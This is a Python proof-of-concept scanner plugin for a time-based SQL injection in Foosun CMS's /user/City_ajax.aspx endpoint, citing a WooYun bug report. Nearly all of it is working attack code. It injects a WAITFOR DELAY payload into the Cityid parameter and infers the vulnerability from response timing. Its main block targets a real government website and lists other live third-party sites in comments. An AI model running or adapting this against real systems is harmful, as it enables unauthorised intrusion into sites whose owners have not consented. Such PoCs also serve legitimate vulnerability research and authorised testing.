#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  风讯cms /user/City_ajax.aspx sql注入
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2010-0150742

"""

import time


def assign(service, arg):
    if service == "foosun":
        return True, arg
        
def audit(arg):
    url = arg + "user/City_ajax.aspx?Cityid=1"
    payload = "%27;WAITFOR%20DELAY%20%270:0:5%27--"
    url2 = url + payload
    time0 = time.time()
    code1, head, res, errcode, _ = curl.curl2(url)
    time1 = time.time()
    code2, head, res, errcode, _ = curl.curl2(url2)
    time2 = time.time()
    if code1==200 and code2==200 and ((time2 - time1) - (time1 - time0)) >= 4:
        security_hole(url + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('foosun', 'http://www.szwzaj.gov.cn/')[1])
    # audit(assign('foosun', 'http://www.ycs120.com/')[1])
    # audit(assign('foosun', 'http://www.jxhshs.com/')[1])